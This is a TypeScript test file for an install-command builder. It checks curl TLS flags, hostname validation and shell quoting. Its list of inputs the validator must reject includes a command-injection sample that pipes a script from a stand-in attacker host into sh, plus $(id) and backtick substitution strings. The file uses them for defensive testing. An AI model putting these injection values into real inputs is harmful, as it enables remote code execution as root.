import assert from "node:assert/strict"
import { argPair, HOSTNAME_PATTERN, installScriptCommand, shellQuote, validHostname } from "./install-command.ts"

const site = "https://198.51.100.7:8444"
const strict = installScriptCommand(site, ["--server " + site], false)
assert.ok(strict.includes("curl -fsSL '"))
assert.ok(!strict.includes(" -k "))
assert.ok(strict.includes("--verify-tls"))
const insecure = installScriptCommand(site, ["--server " + site], true)
assert.ok(insecure.includes("curl -fsSL -k "))
assert.ok(insecure.includes("--insecure"))
assert.ok(insecure.includes("set -eu"))
assert.ok(insecure.includes("mktemp"))
assert.ok(installScriptCommand("http://198.51.100.7", [], false).includes("--insecure"))
assert.equal(installScriptCommand("https://localhost", [], true), "")

// The domain box feeds a command run as root, so it is held to a hostname: no
// metacharacter, no single label, no empty one.
for (const bad of [
  "x; curl http://attacker/s | sh; #",
  "a$(id).example.com",
  "a`id`.example.com",
  "a b.example.com",
  "a\nb.example.com",
  "a'b.example.com",
  'a"b.example.com',
  "a|b.example.com",
  "a&b.example.com",
  "a<b.example.com",
  "a>b.example.com",
  "a{b.example.com",
  "a[b.example.com",
  "a*b.example.com",
  "a?b.example.com",
  "a!b.example.com",
  "a~b.example.com",
  "localhost",
  "",
]) {
  assert.equal(validHostname(bad), false, `accepted ${JSON.stringify(bad)}`)
}
for (const good of ["panel.example.com", "x1-y2.example.co.uk", "A.Example.COM"]) {
  assert.equal(validHostname(good), true, `refused ${good}`)
}
// The same source is the input's `pattern`, which HTML compiles without flags
// under the `v` flag: a pattern that does not compile there is dropped silently,
// leaving the box unchecked.
const asPattern = new RegExp(`^(?:${HOSTNAME_PATTERN})$`, "v")
assert.ok(asPattern.test("panel.example.com"))
assert.ok(!asPattern.test("x; id"))

// A value reaches the shell as one word whatever it holds.
assert.equal(shellQuote("a"), "'a'")
assert.equal(shellQuote("it's"), "'it'\\''s'")
assert.equal(argPair("--vpn-ip", "203.0.113.9"), "--vpn-ip '203.0.113.9'")

// A node that never reported has no address, and the flag is left out rather
// than filled with a `<节点公网IP>` placeholder sh would read as a redirection.
const withAddress = installScriptCommand(site, ["--upgrade", "--vpn", argPair("--vpn-ip", "203.0.113.9")], false)
assert.ok(withAddress.includes("--vpn-ip '203.0.113.9'"))
const withoutAddress = installScriptCommand(site, ["--upgrade", "--vpn"], false)
assert.ok(!withoutAddress.includes("--vpn-ip"))
assert.ok(!withoutAddress.includes("<") && !withAddress.includes("<"))

console.log("install command certificate policy passed")
